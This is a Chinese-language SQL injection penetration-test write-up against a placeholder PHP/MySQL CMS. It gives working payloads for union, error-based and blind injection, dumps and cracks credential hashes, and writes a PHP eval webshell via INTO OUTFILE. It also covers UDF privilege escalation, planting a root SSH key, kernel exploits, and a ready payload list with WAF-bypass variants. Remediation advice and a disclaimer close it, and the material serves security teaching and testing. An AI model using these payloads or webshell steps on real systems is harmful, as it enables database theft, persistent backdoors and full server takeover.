# SQL注入实战案例

## 一、案例背景与目标

### 1.1 目标系统概述

**目标系统**：某企业内部管理系统
- **系统地址**：http://target.example.com
- **系统类型**：PHP + MySQL架构的CMS系统
- **测试范围**：授权渗透测试，已签署授权书
- **测试时间**：2024年X月X日

### 1.2 测试目标

1. 发现并验证SQL注入漏洞
2. 获取数据库敏感信息
3. 尝试获取系统权限
4. 提供完整的修复建议

### 1.3 测试工具

| 工具名称 | 用途 |
|---------|------|
| Burp Suite | 抓包分析、Payload测试 |
| SQLMap | 自动化注入工具 |
| Nmap | 端口扫描、服务识别 |
| Dirsearch | 目录扫描 |

---

## 二、信息收集阶段

### 2.1 端口扫描

```bash
nmap -sV -sC -p- target.example.com
```

**扫描结果**：
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4
80/tcp   open  http        Apache httpd 2.4.6
3306/tcp open  mysql       MySQL 5.7.33
```

### 2.2 目录扫描

```bash
python3 dirsearch.py -u http://target.example.com -e php,html,txt
```

**发现的关键路径**：
```
[200] /index.php
[200] /admin/login.php
[200] /article.php?id=1
[200] /user/profile.php
[403] /admin/config.php
[200] /search.php?keyword=test
```

### 2.3 技术栈识别

通过响应头和页面特征识别：
- **Web服务器**：Apache 2.4.6
- **后端语言**：PHP 7.x
- **数据库**：MySQL 5.7
- **框架**：无框架，原生PHP开发

---

## 三、注入点发现与判断

### 3.1 注入点探测

对发现的参数进行逐一测试：

#### 3.1.1 article.php?id参数测试

**原始请求**：
```
GET /article.php?id=1 HTTP/1.1
Host: target.example.com
```

**单引号测试**：
```
GET /article.php?id=1' HTTP/1.1
```

**响应结果**：
```html
You have an error in your SQL syntax; check the manual that corresponds to 
your MySQL server version for the right syntax to use near '' at line 1
```

**结论**：存在SQL注入，且会回显错误信息。

### 3.2 注入点确认

使用经典的布尔测试：

**测试Payload 1**：
```
?id=1 and 1=1
```
页面正常显示。

**测试Payload 2**：
```
?id=1 and 1=2
```
页面显示"文章不存在"。

**结论**：确认存在布尔型SQL注入。

---

## 四、注入类型识别

### 4.1 联合注入测试

#### 4.1.1 判断列数

使用ORDER BY判断列数：

```sql
?id=1 order by 1--    # 正常
?id=1 order by 2--    # 正常
?id=1 order by 3--    # 正常
?id=1 order by 4--    # 正常
?id=1 order by 5--    # 错误
```

**结论**：查询共4列。

#### 4.1.2 判断回显位置

```sql
?id=-1 union select 1,2,3,4--
```

**页面显示**：
```html
文章标题：2
文章内容：3
```

**结论**：第2列和第3列有回显。

### 4.2 报错注入测试

使用extractvalue函数测试：

```sql
?id=1 and extractvalue(1,concat(0x7e,(select version()),0x7e))--
```

**响应**：
```
XPATH syntax error: '~5.7.33~'
```

**结论**：支持报错注入。

### 4.3 盲注测试

当页面不回显数据时，使用盲注：

#### 4.3.1 布尔盲注

```sql
?id=1 and length(version())>5--
```
页面正常，说明version()长度大于5。

#### 4.3.2 时间盲注

```sql
?id=1 and sleep(5)--
```

响应延迟5秒，确认存在时间盲注。

---

## 五、数据库信息获取

### 5.1 获取基本信息

#### 5.1.1 获取数据库版本

```sql
?id=-1 union select 1,version(),3,4--
```

**结果**：`5.7.33-log`

#### 5.1.2 获取当前用户

```sql
?id=-1 union select 1,user(),3,4--
```

**结果**：`root@localhost`

#### 5.1.3 获取当前数据库

```sql
?id=-1 union select 1,database(),3,4--
```

**结果**：`cms_db`

### 5.2 获取所有数据库

```sql
?id=-1 union select 1,group_concat(schema_name),3,4 from information_schema.schemata--
```

**结果**：
```
information_schema,mysql,performance_schema,sys,cms_db,admin_db
```

### 5.3 获取目标数据库表名

```sql
?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='cms_db'--
```

**结果**：
```
articles,users,admins,config,comments
```

### 5.4 获取表的列名

#### 5.4.1 users表列名

```sql
?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='cms_db' and table_name='users'--
```

**结果**：
```
id,username,password,email,phone,create_time
```

#### 5.4.2 admins表列名

```sql
?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='cms_db' and table_name='admins'--
```

**结果**：
```
id,admin_name,admin_pass,admin_email,last_login
```

---

## 六、数据提取

### 6.1 提取用户数据

```sql
?id=-1 union select 1,group_concat(username,0x3a,password),3,4 from cms_db.users--
```

**结果**：
```
admin:e10adc3949ba59abbe56e057f20f883e,
user1:25d55ad283aa400af464c76d713c07ad,
user2:96e79218965eb72c92a59e2c3d643d0d
```

### 6.2 提取管理员数据

```sql
?id=-1 union select 1,group_concat(admin_name,0x3a,admin_pass),3,4 from cms_db.admins--
```

**结果**：
```
superadmin:21232f297a57a5a743894a0e4a801fc3,
manager:7a57a5a743894a0e4a801fc343894ac
```

### 6.3 密码破解

使用MD5在线解密或John the Ripper：

```bash
echo "e10adc3949ba59abbe56e057f20f883e" > hash.txt
john --format=raw-md5 hash.txt
```

**破解结果**：
| 用户名 | MD5值 | 明文密码 |
|--------|-------|----------|
| admin | e10adc3949ba59abbe56e057f20f883e | 123456 |
| superadmin | 21232f297a57a5a743894a0e4a801fc3 | admin |

### 6.4 使用SQLMap自动化提取

```bash
# 获取数据库列表
sqlmap -u "http://target.example.com/article.php?id=1" --dbs

# 获取表名
sqlmap -u "http://target.example.com/article.php?id=1" -D cms_db --tables

# 获取列名
sqlmap -u "http://target.example.com/article.php?id=1" -D cms_db -T users --columns

# 导出数据
sqlmap -u "http://target.example.com/article.php?id=1" -D cms_db -T users --dump
```

---

## 七、写入WebShell

### 7.1 判断写入条件

#### 7.1.1 查询secure_file_priv

```sql
?id=-1 union select 1,@@secure_file_priv,3,4--
```

**结果**：空值，表示可以在任意位置写入文件。

#### 7.1.2 查询网站路径

通过报错信息或常见路径猜测：
```
/var/www/html/
```

### 7.2 写入WebShell

#### 7.2.1 直接写入

```sql
?id=-1 union select 1,'<?php eval($_POST[cmd]);?>',3,4 into outfile '/var/www/html/shell.php'--
```

#### 7.2.2 使用lines terminated by

当into outfile被过滤时：

```sql
?id=-1 union select 1,'<?php eval($_POST[cmd]);?>',3,4 from users into outfile '/var/www/html/shell.php' lines terminated by 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e--
```

### 7.3 验证WebShell

```bash
curl -d "cmd=system('id');" http://target.example.com/shell.php
```

**响应**：
```
uid=48(apache) gid=48(apache) groups=48(apache)
```

WebShell写入成功！

---

## 八、提权操作

### 8.1 信息收集

通过WebShell收集系统信息：

```bash
# 查看当前用户
id
# uid=48(apache) gid=48(apache) groups=48(apache)

# 查看系统版本
cat /etc/centos-release
# CentOS Linux release 7.9.2009

# 查看内核版本
uname -a
# Linux target 3.10.0-1160.el7.x86_64

# 查找SUID文件
find / -perm -4000 2>/dev/null
```

### 8.2 数据库UDF提权

#### 8.2.1 检查MySQL插件目录

```sql
?id=-1 union select 1,@@plugin_dir,3,4--
```

**结果**：`/usr/lib64/mysql/plugin/`

#### 8.2.2 上传UDF库文件

使用sqlmap的udf提权功能：

```bash
sqlmap -u "http://target.example.com/article.php?id=1" --udf-inject
```

#### 8.2.3 创建自定义函数

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
```

#### 8.2.4 执行系统命令

```sql
?id=-1 union select 1,sys_eval('whoami'),3,4--
```

**结果**：`root`

### 8.3 写入SSH公钥

```bash
# 生成SSH密钥对
ssh-keygen -t rsa

# 通过WebShell写入公钥
echo "ssh-rsa AAAAB3NzaC1yc2E..." > /root/.ssh/authorized_keys

# 连接SSH
ssh root@target.example.com
```

### 8.4 内核漏洞提权

检查是否存在内核漏洞：

```bash
# 搜索可用exp
searchsploit "Linux Kernel 3.10"

# 上传并编译exp
gcc -o exp 40839.c
./exp
```

---

## 九、防御方案与修复建议

### 9.1 代码层面修复

#### 9.1.1 使用预编译语句

**PHP PDO示例**：
```php
<?php
// 错误方式 - 存在SQL注入
$sql = "SELECT * FROM articles WHERE id = " . $_GET['id'];

// 正确方式 - 使用预编译
$pdo = new PDO('mysql:host=localhost;dbname=cms_db', 'user', 'pass');
$stmt = $pdo->prepare('SELECT * FROM articles WHERE id = :id');
$stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
$stmt->execute();
$result = $stmt->fetch();
?>
```

#### 9.1.2 参数类型验证

```php
<?php
$id = $_GET['id'];

// 强制类型转换
$id = intval($id);

// 范围验证
if ($id <= 0 || $id > 10000) {
    die('Invalid ID');
}
?>
```

#### 9.1.3 使用ORM框架

```php
<?php
// 使用Laravel Eloquent
$article = Article::find($id);

// 使用ThinkPHP
$article = Db::name('articles')->where('id', $id)->find();
?>
```

### 9.2 数据库层面加固

#### 9.2.1 最小权限原则

```sql
-- 创建专用账户
CREATE USER 'cms_user'@'localhost' IDENTIFIED BY 'StrongPassword123!';

-- 只授予必要权限
GRANT SELECT, INSERT, UPDATE ON cms_db.* TO 'cms_user'@'localhost';

-- 禁止FILE权限
REVOKE FILE ON *.* FROM 'cms_user'@'localhost';
```

#### 9.2.2 配置secure_file_priv

```ini
# my.cnf
[mysqld]
secure_file_priv = NULL  # 禁止导入导出
# 或
secure_file_priv = /var/lib/mysql-files/  # 限制在特定目录
```

#### 9.2.3 禁用LOCAL_INFILE

```sql
SET GLOBAL local_infile = 0;
```

### 9.3 Web服务器加固

#### 9.3.1 禁用错误回显

**PHP配置**：
```ini
; php.ini
display_errors = Off
log_errors = On
error_log = /var/log/php/error.log
```

#### 9.3.2 配置WAF

**ModSecurity规则**：
```
SecRule ARGS "@rx (?i:union.*select|select.*from|insert.*into|delete.*from)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

#### 9.3.3 目录权限设置

```bash
# 网站目录
chown -R apache:apache /var/www/html
chmod -R 755 /var/www/html

# 禁止写入
find /var/www/html -type d -exec chmod 555 {} \;
```

### 9.4 安全开发规范

1. **输入验证**：对所有用户输入进行严格验证
2. **输出编码**：对输出数据进行适当编码
3. **参数化查询**：始终使用预编译语句
4. **错误处理**：不要向用户暴露详细错误信息
5. **权限控制**：实施最小权限原则
6. **安全审计**：定期进行代码审计和渗透测试

---

## 十、完整Payload记录

### 10.1 注入探测Payload

```
# 单引号测试
?id=1'

# 布尔测试
?id=1 and 1=1
?id=1 and 1=2

# 注释测试
?id=1-- 
?id=1#
?id=1/**/
```

### 10.2 联合注入Payload

```
# 判断列数
?id=1 order by 4--
?id=1 order by 5--

# 联合查询
?id=-1 union select 1,2,3,4--
?id=-1 union select 1,user(),database(),4--
?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()--
?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'--
?id=-1 union select 1,username,password,4 from users limit 0,1--
```

### 10.3 报错注入Payload

```
# extractvalue
?id=1 and extractvalue(1,concat(0x7e,(select version()),0x7e))--
?id=1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--

# updatexml
?id=1 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--

# floor
?id=1 and (select 1 from (select count(*),concat((select version()),floor(rand(0)*2))x from information_schema.tables group by x)a)--
```

### 10.4 盲注Payload

```
# 布尔盲注
?id=1 and length(database())>5--
?id=1 and ascii(substr(database(),1,1))>100--
?id=1 and (select count(*) from users)>10--

# 时间盲注
?id=1 and sleep(5)--
?id=1 and if(length(database())>5,sleep(5),1)--
?id=1 and if(ascii(substr(database(),1,1))>100,sleep(5),1)--
```

### 10.5 写入文件Payload

```
# into outfile
?id=-1 union select 1,'<?php eval($_POST[cmd]);?>',3,4 into outfile '/var/www/html/shell.php'--

# into dumpfile
?id=-1 union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3,4 into dumpfile '/var/www/html/shell.php'--

# lines terminated by
?id=1 into outfile '/var/www/html/shell.php' lines terminated by 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e--
```

### 10.6 绕过WAF Payload

```
# 大小写混合
?id=1 UnIoN SeLeCt 1,2,3,4--

# 内联注释
?id=1 /*!union*/ /*!select*/ 1,2,3,4--

# 双写关键字
?id=1 ununionion selselectect 1,2,3,4--

# 编码绕过
?id=1 %27%20or%201=1--

# 空白符替换
?id=1%09union%0aselect%0b1,2,3,4--

# 等价函数替换
?id=-1 union select 1,concat(user(),0x7e,database()),3,4--
```

---

## 十一、总结

### 11.1 漏洞成因

1. **未使用预编译语句**：直接拼接用户输入
2. **错误信息回显**：暴露数据库结构
3. **权限配置不当**：数据库用户权限过高
4. **缺少输入验证**：未对参数类型进行校验

### 11.2 危害等级

| 等级 | 描述 |
|------|------|
| 高危 | 可获取数据库所有数据 |
| 高危 | 可写入WebShell获取系统权限 |
| 高危 | 可能通过UDF提权获取root权限 |

### 11.3 修复优先级

1. **立即修复**：使用预编译语句
2. **立即修复**：禁用错误回显
3. **短期修复**：配置数据库最小权限
4. **中期修复**：部署WAF防护
5. **长期修复**：安全开发培训

---

## 附录：测试环境信息

| 项目 | 信息 |
|------|------|
| 目标系统 | CMS管理系统 |
| 操作系统 | CentOS 7.9 |
| Web服务器 | Apache 2.4.6 |
| 数据库 | MySQL 5.7.33 |
| PHP版本 | PHP 7.4 |
| 测试工具 | Burp Suite, SQLMap, Nmap |
| 测试日期 | 2024年X月 |
| 授权状态 | 已授权 |

---

> **免责声明**：本文档仅用于授权的安全测试和教育目的。未经授权对他人系统进行渗透测试属于违法行为，请遵守当地法律法规。
